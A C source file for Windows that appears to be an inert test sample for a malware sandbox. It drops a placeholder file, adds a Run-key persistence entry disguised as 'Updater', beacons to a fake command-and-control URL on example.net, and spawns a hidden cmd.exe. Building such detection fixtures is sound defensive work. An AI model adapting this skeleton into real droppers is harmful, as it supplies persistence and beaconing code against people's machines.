#include <windows.h>
#include <wininet.h>
#include <stdio.h>

/* INERT dropper-shaped test PE. Drops a file, writes a Run key, beacons to a
   sinkholed fake C2, and spawns cmd. No real payload; all destinations are
   RFC-reserved and unroutable. Purpose: exercise the Wine detonation path. */
int main(void) {
    /* 1) drop a staged file */
    HANDLE h = CreateFileA("C:\\users\\public\\stage2.bin",
                           GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, "MZstage2payload", 15, &w, NULL); CloseHandle(h);
    }

    /* 2) persistence: Run key */
    HKEY k;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        const char *v = "C:\\users\\public\\stage2.bin";
        RegSetValueExA(k, "Updater", 0, REG_SZ, (const BYTE*)v, (DWORD)strlen(v)+1);
        RegCloseKey(k);
    }

    /* 3) beacon to fake C2 (sinkholed) */
    HINTERNET s = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (s) {
        HINTERNET c = InternetOpenUrlA(s,
            "http://update-cdn.example.net/gate.php?id=win", NULL, 0,
            INTERNET_FLAG_RELOAD, 0);
        if (c) InternetCloseHandle(c);
        InternetCloseHandle(s);
    }

    /* 4) spawn a child process */
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmd[] = "cmd.exe /c echo staged";
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    return 0;
}
